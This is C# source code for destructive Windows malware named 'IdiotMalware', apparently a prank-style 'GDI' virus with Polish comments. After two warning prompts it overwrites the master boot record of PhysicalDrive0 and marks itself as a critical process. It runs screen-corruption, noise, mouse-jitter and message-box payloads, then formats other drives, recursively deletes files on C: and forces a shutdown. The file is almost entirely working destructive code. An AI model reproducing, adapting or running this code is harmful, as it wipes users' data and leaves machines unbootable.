using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.IO;
using System.Collections.Generic;

namespace IdiotMalware
{
    class Program
    {
        // --- API IMPORT ---
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
        [DllImport("kernel32.dll")]
        static extern bool Beep(uint dwFreq, uint dwDuration);
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);
        [DllImport("user32.dll")]
        static extern bool SetProcessDefaultLayout(uint dwDefaultLayout);
        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32.dll")]
        static extern uint SetPixel(IntPtr hdc, int x, int y, uint crColor);
        [DllImport("ntdll.dll")]
        static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        static Random rnd = new Random();

        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();

            if (MessageBox.Show("Warning: Your computer will be destroyed by malware.", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Hand) != DialogResult.Yes) return;
            if (MessageBox.Show("THIS IS YOUR FINAL WARNING. IF YOU CLICK THIS, YOUR COMPUTER WILL BE DESTROYED.", "LAST WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Stop) != DialogResult.Yes) return;

            OverwriteMBR();
            OpenNotePad();

            int isCritical = 1;
            try { NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int)); } catch { }

            // START WSZYSTKICH PAYLOADÓW
            new Thread(Payload_TikTokScroll).Start();
            new Thread(Payload_MouseJitter).Start();
            new Thread(Payload_Cursor_Signs).Start();
            new Thread(Payload_GDI_Chaos).Start(); // Negatyw, RGB split, Tunele
            new Thread(Payload_Audio_Terror).Start(); // Beepy
            new Thread(SlowBurnRoutine).Start();
            new Thread(Payload_Spam_MsgBox).Start();

            Application.Run(new Form() { Opacity = 0, ShowInTaskbar = false, WindowState = FormWindowState.Minimized });
        }

        static void OpenNotePad()
        {
            string path = Path.Combine(Path.GetTempPath(), "READ_ME.txt");
            string content = "Your computer has been damaged by: Chips. Do not attempt to disable the virus process or restart your computer. The computer may still work after shutting down, but once you turn it off, it won't start again because the MBR has been overwritten. I and the other authors are not responsible for any damages.";
            try { File.WriteAllText(path, content); Process.Start("notepad.exe", path); } catch { }
        }

        // --- EFEKT PRZEWIJANIA (TIKTOK/SHORTS) ---
        static void Payload_TikTokScroll()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            while (true)
            {
                BitBlt(hdc, 0, -15, w, h, hdc, 0, 0, 0x00CC0020);
                BitBlt(hdc, 0, h - 15, w, 15, hdc, 0, 0, 0x00CC0020);
                Thread.Sleep(5);
            }
        }

        // --- GDI CHAOS (KOLORY, NEGATYW, GLITCH) ---
        static void Payload_GDI_Chaos()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            while (true)
            {
                int effect = rnd.Next(10);
                if (effect < 2) // Negatyw
                    BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00550009);
                else if (effect < 4) // RGB Split / Glitch
                    BitBlt(hdc, rnd.Next(-10, 10), 0, w, h, hdc, 0, 0, 0x00CC0020);
                else if (effect < 6) // Tunel do środka
                    BitBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, 0x00CC0020);
                
                if (rnd.Next(100) > 98) // Losowe białe linie
                    BitBlt(hdc, 0, rnd.Next(h), w, 2, hdc, 0, 0, 0x00EE0086);

                Thread.Sleep(20);
            }
        }

        static void Payload_Audio_Terror()
        {
            while (true)
            {
                Beep((uint)rnd.Next(100, 2000), 100);
                Thread.Sleep(rnd.Next(50, 500));
            }
        }

        static void Payload_MouseJitter()
        {
            while (true)
            {
                Point p = Cursor.Position;
                Cursor.Position = new Point(p.X + rnd.Next(-10, 11), p.Y + rnd.Next(-10, 11));
                Thread.Sleep(5);
            }
        }

        static void Payload_Cursor_Signs()
        {
            string signs = "CHIPS_EATER_IDIOT_☠_!!!";
            List<Form> trail = new List<Form>();
            for (int i = 0; i < signs.Length; i++)
            {
                Form f = new Form { FormBorderStyle = FormBorderStyle.None, Size = new Size(20, 30), BackColor = Color.Black, TransparencyKey = Color.Black, TopMost = true, ShowInTaskbar = false };
                Label l = new Label { Text = signs[i].ToString(), ForeColor = Color.Yellow, Font = new Font("Comic Sans MS", 18, FontStyle.Bold), Dock = DockStyle.Fill };
                f.Controls.Add(l); f.Show(); trail.Add(f);
            }
            while (true)
            {
                Point target = Cursor.Position;
                for (int i = trail.Count - 1; i > 0; i--) trail[i].Location = trail[i - 1].Location;
                trail[0].Location = new Point(target.X + 20, target.Y + 20);
                Thread.Sleep(15);
            }
        }

        static void SlowBurnRoutine()
        {
            Thread.Sleep(3000);
            SetProcessDefaultLayout(1); // Wszystko na lewo (arabski)
            Thread.Sleep(25000); // 25 sekund czystego szaleństwa
            TotalDestruction();
        }

        static void Payload_Spam_MsgBox()
        {
            while (true) { Thread.Sleep(3000); new Thread(() => MessageBox.Show("CHIPS BE HERE", "Idiot", MessageBoxButtons.OK, MessageBoxIcon.Error)).Start(); }
        }

        static void OverwriteMBR()
        {
            byte[] mbr = new byte[512];
            byte[] bootCode = { 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBE, 0x80, 0x7C, 0xB4, 0x0E, 0xAC, 0x08, 0xC0, 0x74, 0x04, 0xCD, 0x10, 0xEB, 0xF7, 0x31, 0xDB, 0x31, 0xC0, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAB, 0xBF, 0x40, 0x7D, 0x01, 0xDF, 0xB0, 0x2C, 0xB9, 0x60, 0x09, 0xF3, 0xAA, 0x43, 0xB4, 0x86, 0x31, 0xC9, 0xBA, 0x10, 0x27, 0xCD, 0x15, 0xEB, 0xE2 };
            byte[] msg = Encoding.ASCII.GetBytes("Chips Be Here, the computer was eaten by: Chips\0");
            Array.Copy(bootCode, 0, mbr, 0, bootCode.Length); Array.Copy(msg, 0, mbr, 0x80, msg.Length);
            mbr[510] = 0x55; mbr[511] = 0xAA;
            IntPtr hDrive = CreateFile("\\\\.\\PhysicalDrive0", 0x40000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
            if (hDrive != (IntPtr)(-1)) { uint written; WriteFile(hDrive, mbr, 512, out written, IntPtr.Zero); }
        }

        static void TotalDestruction()
        {
            foreach (DriveInfo d in DriveInfo.GetDrives()) { if (d.IsReady && d.Name != "C:\\") { try { Process.Start("cmd.exe", $"/c format {d.Name.Substring(0, 2)} /FS:NTFS /Q /Y /X"); } catch { } } }
            try { Process.Start("cmd.exe", "/c del /s /q /f C:\\*.*"); } catch { }
            Thread.Sleep(2000);
            Process.Start("shutdown", "-s -t 0 -f");
        }
    }
}
